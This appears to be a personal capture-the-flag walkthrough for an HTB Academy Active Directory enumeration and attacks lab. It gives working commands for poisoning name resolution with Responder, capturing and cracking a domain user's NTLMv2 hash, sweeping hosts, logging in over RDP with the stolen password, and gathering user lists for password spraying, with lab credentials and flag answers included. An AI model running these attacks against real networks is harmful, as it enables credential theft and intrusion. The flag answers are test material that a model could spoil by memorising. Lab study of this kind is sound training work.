### Connection to Target

SSH
```go
sshpass -p 'HTB_@cademy_stdnt!' ssh htb-student@10.129.11.74
```

xfreerdp
```go
xfreerdp /v:10.129.12.127 /u:htb-student /p:'HTB_@cademy_stdnt!' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

#### Question 1: Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain. What is the account name?


Log into the host. The user can sudo on everything. Use responder to grab a hash within the 172.16.6.0 subnet

```go
sudo responder -I ens224 -wfrv
```

Username and hash
```go
INLANEFREIGHT\AB920
```

```go
AB920::INLANEFREIGHT:6741b51d529201c7:F8653C1E3120B191A7DA708C0E363F8B:0101000000000000805C79559355D801CC5F7452B6AB182600000000020008005900560041004C0001001E00570049004E002D003000440031004C005700350056004C0037004100320004003400570049004E002D003000440031004C005700350056004C003700410032002E005900560041004C002E004C004F00430041004C00030014005900560041004C002E004C004F00430041004C00050014005900560041004C002E004C004F00430041004C0007000800805C79559355D801060004000200000008003000300000000000000000000000002000008FD5B9337124CEC895A3C0D2FD95F12FA421AA37FCF02A652FE227B46BB832DB0A0010000000000000000000000000000000000009002E0063006900660073002F0049004E004C0041004E0045004600520049004700480054002E004C004F00430041004C00000000000000000000000000
```

#### Question 2: What is this user's cleartext password?

Crack the hash
```go
hashcat -m 5600 ab920_hash /usr/share/wordlists/rockyou.txt --force -O
```

Answer:
```go
weasal
```

#### Question 3: Submit the contents of the C:\flag.txt file on MS01.

Find other hosts on the network from this host
```go
for i in {1..254} ;do (ping -c 1 172.16.7.$i | grep "bytes from" &) ;done
```

![[Pasted image 20260531005943.png]]

Determine which host is MS01

```go
172.16.7.50
```

NMAP scan for 172.16.7.50 shows this is MS01
![[Pasted image 20260531010900.png]]


```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:'weasal' /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200 /cert:ignore
```

Answer:
```go
aud1t_gr0up_m3mbersh1ps!
```

>[!Tip] Who is 172.16.7.60?
>

NMAP Scan for 172.16.7.60 shows it's name as `SQL01`
![[Pasted image 20260531011220.png]]

#### Question 4: Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.

```go
HTB_@cademy_stdnt!
```

```go
ssh -X htb-student@10.129.16.227
```


Head to your Kerbrute directory in `cd ~/tools/kerbrute` and execute`sudo make all` if you don't have a Windows executable ..

```go
scp PowerView.ps1 kerbrute_windows_amd64.exe htb-student@10.129.16.227:~/Desktop/HTB
```

>[!Warning] "$DISPLAY environment variable not properly set" error message
> I got the above error message when attempting to RDP into the MS01 host. You must ssh via `ssh -X user@remote_host` to let SSH handle the tunneling via the -X or -Y flags

```go
xfreerdp /v:172.16.7.50 /u:AB920 /p:weasal /drive:HTB,/home/dan/Desktop/HTB/13-Active-Directory-Enumeration-And-Attacks/Skills /smart-sizing:2400x1200
```

>[!Info] Try any of these and pair it with the password spraying technique

Export to username list
```go
Get-NetUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\userlist.txt
```

```go
Get-DomainUser | Select-Object -ExpandProperty samaccountname | Out-File -FilePath .\ad_users.txt -NoTypeInformation
```

Export admin to admin_users.txt
```go
Get-NetUser | Where-Object { $_.samaccountname -like "*admin*" } |
    Select-Object -ExpandProperty samaccountname |
    Out-File .\admin_users.txt
```

